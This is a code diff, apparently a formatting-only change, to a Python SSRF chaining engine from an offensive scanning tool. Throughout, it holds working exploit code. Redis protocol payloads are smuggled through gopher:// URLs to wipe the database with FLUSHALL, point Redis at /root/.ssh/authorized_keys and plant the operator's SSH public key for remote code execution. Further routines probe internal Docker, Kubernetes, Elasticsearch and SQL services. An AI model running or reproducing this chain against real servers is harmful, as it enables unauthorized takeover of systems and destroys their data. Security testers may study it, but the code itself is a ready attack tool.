@@ -53,18 +53,11 @@ REDIS_PROTOCOL_PAYLOADS = {
     "info": "*1\r\n$4\r\nINFO\r\n",
     "flushall": "*1\r\n$8\r\nFLUSHALL\r\n",
     "config_get_dir": "*3\r\n$6\r\nconfig\r\n$3\r\nget\r\n$3\r\ndir\r\n",
-    "config_set_dir": (
-        "*4\r\n$6\r\nconfig\r\n$3\r\nset\r\n$3\r\ndir\r\n"
-        "$16\r\n/root/.ssh/\r\n"
-    ),
+    "config_set_dir": ("*4\r\n$6\r\nconfig\r\n$3\r\nset\r\n$3\r\ndir\r\n$16\r\n/root/.ssh/\r\n"),
     "config_set_dbfilename": (
-        "*4\r\n$6\r\nconfig\r\n$3\r\nset\r\n$10\r\ndbfilename\r\n"
-        "$15\r\nauthorized_keys\r\n"
+        "*4\r\n$6\r\nconfig\r\n$3\r\nset\r\n$10\r\ndbfilename\r\n$15\r\nauthorized_keys\r\n"
     ),
-    "set_ssh_key": (
-        "*3\r\n$3\r\nset\r\n$1\r\n1\r\n"
-        "$%d\r\n%s\r\n"
-    ),
+    "set_ssh_key": ("*3\r\n$3\r\nset\r\n$1\r\n1\r\n$%d\r\n%s\r\n"),
     "save": "*1\r\n$4\r\nsave\r\n",
 }
 
@@ -82,7 +75,7 @@ DOCKER_PAYLOADS = {
     "images": "/images/json",
     "info": "/info",
     "version": "/version",
-    "exec_create": '/containers/%s/exec',
+    "exec_create": "/containers/%s/exec",
 }
 
 
@@ -144,7 +137,11 @@ class SSRFChainEngine:
                         result.max_depth_reached = max(result.max_depth_reached, depth + 1)
                         self._extract_redis_evidence(redis_result, result)
 
-                elif proto.startswith("MySQL") or proto.startswith("PostgreSQL") or proto.startswith("MSSQL"):
+                elif (
+                    proto.startswith("MySQL")
+                    or proto.startswith("PostgreSQL")
+                    or proto.startswith("MSSQL")
+                ):
                     sql_result = self._chain_sql(base_url, param, host, port, proto)
                     result.hops.append(sql_result)
                     if sql_result.success:
@@ -180,18 +177,23 @@ class SSRFChainEngine:
                 target_url = "%s%s:%d" % (scheme, host, port)
                 test_url = base_url.replace(param + "=", param + "=" + target_url)
                 try:
-                    r = self.sess.get(test_url, timeout=max(3, self.timeout * 0.5),
-                                      allow_redirects=False)
+                    r = self.sess.get(
+                        test_url, timeout=max(3, self.timeout * 0.5), allow_redirects=False
+                    )
                     if r.status_code not in (0, 502, 503) and len(r.text) > 0:
-                        found.append({
-                            "host": host,
-                            "port": port,
-                            "protocol": proto,
-                            "status": r.status_code,
-                            "size": len(r.text),
-                            "preview": r.text[:200],
-                        })
-                        logger.info("discovered %s://%s:%d (%d bytes)", scheme, host, port, len(r.text))
+                        found.append(
+                            {
+                                "host": host,
+                                "port": port,
+                                "protocol": proto,
+                                "status": r.status_code,
+                                "size": len(r.text),
+                                "preview": r.text[:200],
+                            }
+                        )
+                        logger.info(
+                            "discovered %s://%s:%d (%d bytes)", scheme, host, port, len(r.text)
+                        )
                         break
                 except Exception:
                     continue
@@ -202,7 +204,11 @@ class SSRFChainEngine:
         target = "%s:%d" % (host, port)
 
         info_payload = REDIS_PROTOCOL_PAYLOADS["info"]
-        gopher_url = "gopher://%s:%d/_%s" % (host, port, requests.utils.quote(info_payload, safe=""))
+        gopher_url = "gopher://%s:%d/_%s" % (
+            host,
+            port,
+            requests.utils.quote(info_payload, safe=""),
+        )
         test_url = base_url.replace(param + "=", param + "=" + gopher_url)
         try:
             r = self.sess.get(test_url, timeout=self.timeout)
@@ -210,8 +216,12 @@ class SSRFChainEngine:
                 chain_path.append("redis_info_leak")
                 re.search(r"redis_version:(\d+\.\d+\.\d+)", r.text)
                 return HopResult(
-                    hop=1, protocol="redis", target=target, port=port,
-                    success=True, response_preview=r.text[:300],
+                    hop=1,
+                    protocol="redis",
+                    target=target,
+                    port=port,
+                    success=True,
+                    response_preview=r.text[:300],
                     chain_path=chain_path,
                 )
         except Exception:
@@ -219,7 +229,10 @@ class SSRFChainEngine:
 
         ssh_key = self._get_ssh_key()
         if ssh_key:
-            set_key = REDIS_PROTOCOL_PAYLOADS["set_ssh_key"] % (len(ssh_key), requests.utils.quote(ssh_key, safe=""))
+            set_key = REDIS_PROTOCOL_PAYLOADS["set_ssh_key"] % (
+                len(ssh_key),
+                requests.utils.quote(ssh_key, safe=""),
+            )
             full_payload = (
                 REDIS_PROTOCOL_PAYLOADS["flushall"]
                 + REDIS_PROTOCOL_PAYLOADS["config_set_dir"]
@@ -227,22 +240,35 @@ class SSRFChainEngine:
                 + set_key
                 + REDIS_PROTOCOL_PAYLOADS["save"]
             )
-            gopher_url = "gopher://%s:%d/_%s" % (host, port, requests.utils.quote(full_payload, safe=""))
+            gopher_url = "gopher://%s:%d/_%s" % (
+                host,
+                port,
+                requests.utils.quote(full_payload, safe=""),
+            )
             test_url = base_url.replace(param + "=", param + "=" + gopher_url)
             try:
                 r = self.sess.get(test_url, timeout=self.timeout)
                 chain_path.append("redis_ssh_key_inject")
                 return HopResult(
-                    hop=2, protocol="redis_rce", target=target, port=port,
-                    success=True, response_preview="ssh_key_injected",
+                    hop=2,
+                    protocol="redis_rce",
+                    target=target,
+                    port=port,
+                    success=True,
+                    response_preview="ssh_key_injected",
                     chain_path=chain_path,
                 )
             except Exception:
                 pass
 
         return HopResult(
-            hop=1, protocol="redis", target=target, port=port,
-            success=False, chain_path=chain_path, error="redis_access_failed",
+            hop=1,
+            protocol="redis",
+            target=target,
+            port=port,
+            success=False,
+            chain_path=chain_path,
+            error="redis_access_failed",
         )
 
     def _chain_sql(self, base_url: str, param: str, host: str, port: int, proto: str) -> HopResult:
@@ -258,23 +284,34 @@ class SSRFChainEngine:
         else:
             payload = SQL_PAYLOADS["mysql_info"]
 
-        test_url = base_url.replace(param + "=", param + "=" + requests.utils.quote(payload, safe=""))
+        test_url = base_url.replace(
+            param + "=", param + "=" + requests.utils.quote(payload, safe="")
+        )
         try:
             r = self.sess.get(test_url, timeout=self.timeout)
             version_match = re.search(r"(\d+\.\d+\.\d+[-\w]*)", r.text)
             if version_match:
                 chain_path.append("sql_version_leak")
                 return HopResult(
-                    hop=1, protocol=proto.lower(), target=target, port=port,
-                    success=True, response_preview=version_match.group(1),
+                    hop=1,
+                    protocol=proto.lower(),
+                    target=target,
+                    port=port,
+                    success=True,
+                    response_preview=version_match.group(1),
                     chain_path=chain_path,
                 )
         except Exception:
             pass
 
         return HopResult(
-            hop=1, protocol=proto.lower(), target=target, port=port,
-            success=False, chain_path=chain_path, error="sql_probe_failed",
+            hop=1,
+            protocol=proto.lower(),
+            target=target,
+            port=port,
+            success=False,
+            chain_path=chain_path,
+            error="sql_probe_failed",
         )
 
     def _chain_docker(self, base_url: str, param: str, host: str, port: int) -> HopResult:
@@ -294,8 +331,12 @@ class SSRFChainEngine:
                         chain_path.append("docker_%s" % name)
                         if name == "containers" and isinstance(data, list):
                             return HopResult(
-                                hop=1, protocol="docker", target=target, port=port,
-                                success=True, response_preview=str(data)[:300],
+                                hop=1,
+                                protocol="docker",
+                                target=target,
+                                port=port,
+                                success=True,
+                                response_preview=str(data)[:300],
                                 chain_path=chain_path,
                             )
                     except ValueError:
@@ -304,8 +345,13 @@ class SSRFChainEngine:
                 continue
 
         return HopResult(
-            hop=1, protocol="docker", target=target, port=port,
-            success=False, chain_path=chain_path, error="docker_api_failed",
+            hop=1,
+            protocol="docker",
+            target=target,
+            port=port,
+            success=False,
+            chain_path=chain_path,
+            error="docker_api_failed",
         )
 
     def _chain_k8s(self, base_url: str, param: str, host: str, port: int) -> HopResult:
@@ -322,8 +368,12 @@ class SSRFChainEngine:
                         data = r.json()
                         chain_path.append("k8s_%s" % path.strip("/"))
                         return HopResult(
-                            hop=1, protocol="k8s", target=target, port=port,
-                            success=True, response_preview=str(data)[:300],
+                            hop=1,
+                            protocol="k8s",
+                            target=target,
+                            port=port,
+                            success=True,
+                            response_preview=str(data)[:300],
                             chain_path=chain_path,
                         )
                     except ValueError:
@@ -331,8 +381,13 @@ class SSRFChainEngine:
             except Exception:
                 continue
         return HopResult(
-            hop=1, protocol="k8s", target=target, port=port,
-            success=False, chain_path=chain_path, error="k8s_probe_failed",
+            hop=1,
+            protocol="k8s",
+            target=target,
+            port=port,
+            success=False,
+            chain_path=chain_path,
+            error="k8s_probe_failed",
         )
 
     def _chain_elasticsearch(self, base_url: str, param: str, host: str, port: int) -> HopResult:
@@ -350,27 +405,41 @@ class SSRFChainEngine:
                         chain_path.append("es_%s" % path.strip("/"))
                         if "cluster_name" in data or "indices" in str(data)[:500]:
                             return HopResult(
-                                hop=1, protocol="elasticsearch", target=target, port=port,
-                                success=True, response_preview=str(data)[:300],
+                                hop=1,
+                                protocol="elasticsearch",
+                                target=target,
+                                port=port,
+                                success=True,
+                                response_preview=str(data)[:300],
                                 chain_path=chain_path,
                             )
                     except ValueError:
                         if "elastic" in r.text.lower() or "cluster" in r.text.lower():
                             chain_path.append("es_html_leak")
                             return HopResult(
-                                hop=1, protocol="elasticsearch", target=target, port=port,
-                                success=True, response_preview=r.text[:300],
+                                hop=1,
+                                protocol="elasticsearch",
+                                target=target,
+                                port=port,
+                                success=True,
+                                response_preview=r.text[:300],
                                 chain_path=chain_path,
                             )
             except Exception:
                 continue
         return HopResult(
-            hop=1, protocol="elasticsearch", target=target, port=port,
-            success=False, chain_path=chain_path, error="es_probe_failed",
+            hop=1,
+            protocol="elasticsearch",
+            target=target,
+            port=port,
+            success=False,
+            chain_path=chain_path,
+            error="es_probe_failed",
         )
 
     def _get_ssh_key(self) -> str:
         import os
+
         key_paths = [
             os.path.expanduser("~/.ssh/id_rsa.pub"),
             os.path.expanduser("~/.ssh/id_ed25519.pub"),
@@ -387,19 +456,22 @@ class SSRFChainEngine:
         if hop.success and "redis_info_leak" in hop.chain_path:
             version_match = re.search(r"redis_version:(\d+\.\d+\.\d+)", hop.response_preview)
             if version_match:
-                result.evidence.append({
-                    "type": "redis_version_leak",
-                    "version": version_match.group(1),
-                    "hop": hop.hop,
-                })
+                result.evidence.append(
+                    {
+                        "type": "redis_version_leak",
+                        "version": version_match.group(1),
+                        "hop": hop.hop,
+                    }
+                )
         if hop.success and "redis_ssh_key_inject" in hop.chain_path:
             result.ssh_keys.append("redis_authorized_keys_injected")
             result.rce_achieved = True
             result.rce_method = "redis_gopher_ssh"
 
 
-def chain_ssrf(base_url: str, param: str, sess: requests.Session,
-               timeout: float = 10.0, max_hops: int = 3) -> Dict:
+def chain_ssrf(
+    base_url: str, param: str, sess: requests.Session, timeout: float = 10.0, max_hops: int = 3
+) -> Dict:
     engine = SSRFChainEngine(sess, timeout)
     chain_result = engine.chain_full(base_url, param, max_hops)
 
